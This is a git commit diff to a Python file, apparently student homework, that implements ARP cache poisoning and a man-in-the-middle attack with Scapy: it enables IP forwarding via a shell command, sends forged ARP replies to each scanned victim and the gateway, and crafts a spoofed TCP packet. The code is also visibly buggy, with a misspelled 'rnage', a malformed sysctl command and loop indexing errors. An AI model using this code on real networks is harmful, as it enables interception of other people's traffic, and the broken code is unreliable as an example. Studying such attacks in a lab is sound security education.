af6f43a6f486e11e46adece4a7e2ebcb8bdfda07
q40603 <q40603@gmail.com>
2020-05-07 12:29:11 +0800

    forward

--- hw2/arp.py
+++ hw2/arp.py
@@ -44,6 +44,7 @@ def scan_net(ip):
 
 
 def arp():
+	os.system("sudo sysctl -w net.ipv4.ip_forward"+str(1))
 	attacker_ip, attacker_mac = attacker()
 
 	scan_net(attacker_ip)
@@ -72,14 +73,15 @@ def arp():
 	print(p)
 	
 	# for i in range(len(vip)):
-	
-	for i in range(10):
-		print('send arp ', i)
-		sendp(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
-		hwdst='08:00:27:f1:c3:95', hwsrc=attacker_mac, op=2))
-		sendp(Ether(dst='52:54:00:12:35:00', src=attacker_mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
-		hwdst='52:54:00:12:35:00', hwsrc=attacker_mac, op=2))
-		time.sleep(0.1)
+
+	for v in rnage(len(vip)):
+		for i in range(10):
+			print('send arp ', i)
+			sendp(Ether(dst=vip[i], src=attacker_mac)/ARP(pdst=vip[i], psrc=ap_ip, 
+		hwdst=vmac[i], hwsrc=attacker_mac, op=2))
+			sendp(Ether(dst=ap_mac, src=attacker_mac)/ARP(pdst=ap_ip, psrc=vip[i], 
+			hwdst=vmac[i], hwsrc=attacker_mac, op=2))
+			time.sleep(0.1)
 
 # spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
 # 		sendp(spoof_vic_pkt)
@@ -92,7 +94,7 @@ def middle_man():
 	s.show()
 	dstport = s[0][TCP].sport
 	seqq = s[0][TCP].seq
-	result, un = sr(IP(src='140.113.207.246', dst='10.0.2.4')/
+	result, un = sr(IP(src='140.113.207.246', dst=attacker_ip)/
 		TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
 	result.show()
 
